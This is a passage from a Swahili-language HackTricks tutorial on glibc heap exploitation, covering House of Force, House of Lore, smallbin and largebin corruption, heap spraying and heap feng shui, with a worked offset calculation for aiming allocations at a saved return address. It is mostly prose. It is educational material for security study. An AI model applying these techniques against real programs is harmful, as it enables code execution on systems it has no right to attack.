Hivyo, tunaweza kufanya pointer huu uelekee popote. Walakini, sio kila eneo ni sahihi, ukubwa wa kipande bandia lazima uwe mdogo kuliko av->max\_fast na haswa sawa na ukubwa ulioombwa katika wito wa baadaye wa malloc()+8. Kwa hivyo, ikiwa tunajua kwamba baada ya pointer huu wa kuharibika kuna wito wa malloc(40), ukubwa wa kipande bandia lazima uwe sawa na 48.

Kwa mfano, ikiwa programu itauliza mtumiaji nambari tunaweza kuingiza 48 na kuuelekeza pointer wa malloc uliobadilishwa kwa 4bytes zifuatazo (ambazo zinaweza kuwa sehemu ya EBP kwa bahati nzuri, hivyo 48 inabaki nyuma, kana kwamba ni kichwa cha ukubwa). Kwa kuongezea, anwani ptr-4+48 lazima itimize masharti kadhaa (ikiwa katika kesi hii ptr=EBP), yaani, 8 < ptr-4+48 < av->system\_mem.

Ikiwa hii itatimizwa, wakati wito ufuatao wa malloc ambao tulisema ni malloc(40) unaitwa, anwani yake itakuwa anwani ya EBP. Ikiwa mshambuliaji pia anaweza kudhibiti kile kinachoandikwa kwenye malloc hii, anaweza kubadilisha EBP na EIP na anwani anayotaka.

Nadhani hii ni kwa sababu wakati free() inafuta itahifadhi kwamba kuna kipande cha ukubwa kamili kwa malloc() mpya inayotaka kuhifadhi, kwa hivyo inamwekea anwani hiyo.

**The House of Force**

Inahitajika:

* Kuharibika kwa kipande ambacho inaruhusu kubadilisha wilderness
* Wito wa malloc() na ukubwa uliowekwa na mtumiaji
* Wito wa malloc() ambao data yake inaweza kuwekwa na mtumiaji

Jambo la kwanza linalofanywa ni kubadilisha ukubwa wa kipande cha wilderness na thamani kubwa sana (0xffffffff), hivyo ombi lolote la kumbukumbu kubwa kutosha litashughulikiwa katika \_int\_malloc() bila haja ya kupanua heap

Jambo la pili ni kubadilisha av->top ili ielekee eneo la kumbukumbu chini ya udhibiti wa mshambuliaji, kama stack. Av->top itawekwa \&EIP - 8.

Tunapaswa kubadilisha av->top ili ielekee eneo la kumbukumbu chini ya udhibiti wa mshambuliaji:

mlemavu = av->top;

mabaki = chunck\_at\_offset(mlemavu, nb);

av->top = mabaki;

Mlemavu hukusanya thamani ya anwani ya kipande cha wilderness cha sasa (av->top ya sasa) na mabaki ni haswa jumla ya anwani hiyo plus idadi ya bytes zilizoombwa na malloc(). Kwa hivyo ikiwa \&EIP-8 iko kwenye 0xbffff224 na av->top ina 0x080c2788, basi kiasi tunachohitaji kuweka kwenye malloc iliyodhibitiwa ili av->top ielekee $EIP-8 kwa malloc() ijayo itakuwa:

0xbffff224 - 0x080c2788 = 3086207644.

Kwa hivyo thamani iliyobadilishwa itahifadhiwa kwenye av->top na malloc ijayo itaelekeza kwa EIP na inaweza kubadilishwa.

Ni muhimu kujua kwamba ukubwa wa kipande kipya cha wilderness uwe mkubwa kuliko ombi lililofanywa na malloc la mwisho. Yaani, ikiwa wilderness inaelekeza kwa \&EIP-8, ukubwa utabaki kwenye uga wa EBP wa stack.

**The House of Lore**

**Uharibifu wa SmallBin**

Vipande vilivyofutwa vinawekwa kwenye bin kulingana na ukubwa wao. Lakini kabla ya kuwekwa, vinahifadhiwa kwenye unsorted bins. Kipande kilichofutwa hakijawekwa moja kwa moja kwenye bin yake bali kinabaki kwenye unsorted bins. Kisha, ikiwa kipande kipya kinahitajika na kipande kilichofutwa kinaweza kutumika, kinarudishwa, lakini ikiwa kipande kikubwa zaidi kinahitajika, kipande kilichofutwa kwenye unsorted bins kinawekwa kwenye bin yake sahihi.

Ili kufikia kanuni inayoweza kuharibika, ombi la kumbukumbu lazima liwe kubwa kuliko av->max\_fast (kawaida 72) na chini ya MIN\_LARGE\_SIZE (512).

Ikiwa kuna kipande kwenye bin lenye ukubwa unaofaa kwa ombi, kipande hicho kitarudishwa baada ya kufunguliwa:

bck = mlemavu->bk; Inaelekeza kwenye kipande kilichotangulia, hii ndio habari pekee tunayoweza kubadilisha.

bin->bk = bck; Kipande cha pili kinakuwa cha mwisho, ikiwa bck inaelekeza kwenye stack, kipande kifuatacho kinachotengwa kitapewa anwani hii

bck->fd = bin; Orodha inafungwa kwa kufanya hii ielekee kwa bin

Inahitajika:
Reserve malloc mbili, ili ya kwanza iweze kufanya overflow baada ya ya pili kuwa imeachiliwa na kuingizwa kwenye bin yake (yaani, malloc kubwa zaidi kuliko ya pili kabla ya kufanya overflow)

Malloc iliyoreserviwa ambayo inapewa anwani iliyochaguliwa na mshambuliaji inadhibitiwa na mshambuliaji.

Lengo ni, ikiwa tunaweza kufanya overflow kwa heap ambayo ina sehemu iliyofunguliwa chini yake na kwenye bin yake, tunaweza kubadilisha pointer yake bk. Ikiwa tunabadilisha pointer yake bk na sehemu hii inakuwa ya kwanza kwenye orodha ya bin na kuhifadhiwa, bin itadanganywa na kuelezwa kuwa sehemu ya mwisho ya orodha (inayofuata kutoa) iko kwenye anwani ya uwongo tuliyoweka (kwenye stack au GOT kwa mfano). Kwa hivyo, ikiwa sehemu nyingine itahifadhiwa na mshambuliaji ana ruhusa ndani yake, atapewa sehemu kwenye nafasi inayotakiwa na ataweza kuandika ndani yake.

Baada ya kufungua sehemu iliyobadilishwa, ni muhimu kuhifadhi sehemu kubwa kuliko ile iliyofunguliwa, ili sehemu iliyobadilishwa itoke kwenye unsorted bins na iingizwe kwenye bin yake.

Marafiki kwenye bin wanapaswa kusubiri hadi wito wa malloc() ufanyike mara kutosha ili bin iliyobadilishwa itumike tena na kudanganya bin ikiamini kwamba sehemu inayofuata iko kwenye anwani ya uwongo. Na kisha sehemu inayotakiwa itatolewa.

Ili kutekeleza udhaifu haraka iwezekanavyo, ni bora: Kuhifadhi sehemu inayoweza kudhuriwa, kuhifadhi sehemu itakayobadilishwa, kufungua sehemu hii, kuhifadhi sehemu kubwa kuliko ile itakayobadilishwa, kubadilisha sehemu (udhaifu), kuhifadhi sehemu ya ukubwa sawa na ile iliyovunjwa na kuhifadhi sehemu ya pili ya ukubwa sawa na hiyo na hii itakuwa ile itakayoelekeza kwenye anwani iliyochaguliwa.

Ili kulinda shambulio hili, uthibitisho wa kawaida kwamba sehemu "si" ni ya uwongo hutumiwa: inathibitishwa ikiwa bck->fd inaelekeza kwa mwathiriwa. Yaani, katika kesi yetu ikiwa pointer wa fd\* wa sehemu ya uwongo iliyoelekezwa kwenye stack inaelekeza kwa mwathiriwa. Ili kuvuka kinga hii, mshambuliaji lazima aweze kuandika kwa njia fulani (labda kwa stack) kwenye anwani sahihi ya mwathiriwa. Ili ionekane kama sehemu ya kweli.

**Uharibifu wa LargeBin**

Mahitaji sawa na hapo awali yanahitajika na mengine zaidi, pamoja na sehemu zilizohifadhiwa lazima ziwe kubwa kuliko 512.

Shambulio ni kama lile lililopita, yaani, lazima kubadilisha pointer bk na wito wote huo wa malloc(), lakini pia lazima kubadilisha ukubwa wa sehemu iliyobadilishwa ili ukubwa huo - nb uwe < MINSIZE.

Kwa mfano, itabidi kuweka ukubwa kuwa 1552 ili 1552 - 1544 = 8 < MINSIZE (kutoa haiwezi kuwa hasi kwa sababu inalinganishwa na isiyosainiwa)

Pia, kuna kipande cha programu kilichoingizwa ili kufanya iwe ngumu zaidi.

**Heap Spraying**

Kimsingi inahusisha kuhifadhi kumbukumbu yote inayowezekana kwa heaps na kuzijaza na safu ya nops zilizomalizika na shellcode. Kama safu, 0x0c hutumiwa. Kwa hivyo, jaribio litakuwa kusonga kwenye anwani 0x0c0c0c0c, na hivyo ikiwa anwani yoyote itaandikwa na safu hii itaitwa, itaenda hapo. Kimsingi mkakati ni kuhifadhi kiasi kikubwa iwezekanavyo kuona ikiwa pointer yoyote itaandikwa na kusonga kwa 0x0c0c0c0c kwa matumaini kwamba kuna nops hapo.

**Heap Feng Shui**

Inahusisha kusimamisha kumbukumbu kwa njia ya kuhifadhi na kufungua kumbukumbu ili kubaki sehemu zilizohifadhiwa kati ya sehemu zilizofunguliwa. Buffer ya kufurika itawekwa kwenye moja ya vipande hivi.

## Kozi za Kuvutia

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **Vyanzo**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **fuata** sisi kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
